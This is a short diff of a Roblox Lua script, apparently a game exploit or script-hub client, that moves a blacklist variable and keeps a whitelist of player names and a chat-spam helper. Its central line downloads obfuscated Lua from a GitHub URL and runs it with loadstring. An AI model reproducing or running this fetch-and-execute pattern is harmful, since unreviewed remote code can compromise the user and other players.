@@ -8,14 +8,14 @@ local whitelisted = {"susamongusbkaka","StvrxqzAlt","Damix2131","DamixNeverDies"
 local ownertalk = true
 local webLink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
 local lol = game.Players.LocalPlayer
-local blacklistLOL = true
-local SkidMoment = {"ghghghghghghgh1312"}
 
 function say(msg)
 	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
 end
 wait(0.2)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
+local blacklistLOL = true
+local SkidMoment = {"ghghghghghghgh1312"}
 wait(0.4)
 
 
